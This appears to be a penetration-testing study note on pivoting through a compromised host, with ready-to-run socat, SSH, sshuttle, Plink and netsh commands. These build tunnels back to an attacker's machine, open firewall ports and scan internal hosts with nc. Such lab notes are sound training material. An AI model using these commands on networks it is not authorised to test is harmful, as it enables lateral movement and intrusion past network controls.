Used to access machines that our host machine is unable to access in a topology but a machine that we managed to gain access to have access to
Example:
![[Pasted image 20240427112512.png]]
## Linux
1st Way: socat
```
socat -ddd TCP-LISTEN:[port],fork TCP:$ip:$port

$ip is the machine you are trying to access

from there, you can access the machine through the listening port of the machine you ran socat on
```
2nd Way: using ssh
```
Local Port Forwarding
first get the pty shell

then we need to find out the ip routing so we can create the port forward

for i in $(seq 1 254); do nc -zv -w 1 $ip $port; done (ONLY IF THERE ARE NO PORT SCANNER)

ssh -N -L 0.0.0.0:4455:$ip:$port [user]@$ip2

$ip is the machine you are trying to access (in below picture it is ????)
$ip2 is the machine you can access creds (in below picture it is PGDATABASE01)
```
![[Pasted image 20240427115034.png]]
```
Dynamic Port Forwarding
first get the pty shell

ssh -N -D 0.0.0.0:9999 [user]@$ip

$ip is the machine you can access with creds

setup proxychains next, vi /etc/proxychains4.conf
sock5 [your openvpn ip] 9999

from there you can access the machines behind the machine you can access with creds, just add proxychains to the command you want to run at the front
```
```
Remote Port Forwarding
first start ssh server on your own machine (systemctl start ssh)

get pty shell

ssh -N -R 127.0.0.1:2345:$ip:$port nic@$openvpnip

$ip is the machine you are trying to access

verify connection with ss -ntplu
```
```
Remote Dynamic Port Forwarding
first start ssh server on your own machine

get pty shell

ssh -N -R 9998 kali@$openvpnip

verify connection with ss -ntplu

setup proxychains but this time use sock5 127.0.0.1 9998
```
3rd way: using sshuttle (requires root privileges)
```
first set up socat
socat TCP-LISTEN:2222,fork TCP:$ip:22

$ip is the machine that the current one can access

on kali, run sshuttle -r [user]$ip1:2222 [whatever subnets you are trying to access]

$ip1 is the ip address of the machine you set up socat on

from there, just run your commands as if you are connected to all of the machines
```
## Windows
1st way: using ssh.exe
```
first determine if ssh is in the machine and also the version of it

in cmd: where ssh, ssh.exe -V

if version >7.6, we can do remote dynamic port forwarding

from there follow the steps above according to the method
```
2nd way: using Plink
```
plink.exe -ssh -l nic -pw nic -R 127.0.0.1:9833:127.0.0.1:3389 $openvpnip
```
3rd way: using Netsh
```
run cmd as admin

netsh interface portproxy add v4tov4 listenport=2222 listenaddress=$ip connectport=22 connectaddress=$ip2

$ip is the address of the current machine, $ip2 is the address of the machine you are trying to access

if access is blocked to port 2222,
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=$ip localport=2222 action=allow

from there, connect into ssh of $ip2 normally through port 2222 in $ip

verify rule with netstat -anp TCP | find "2222"
```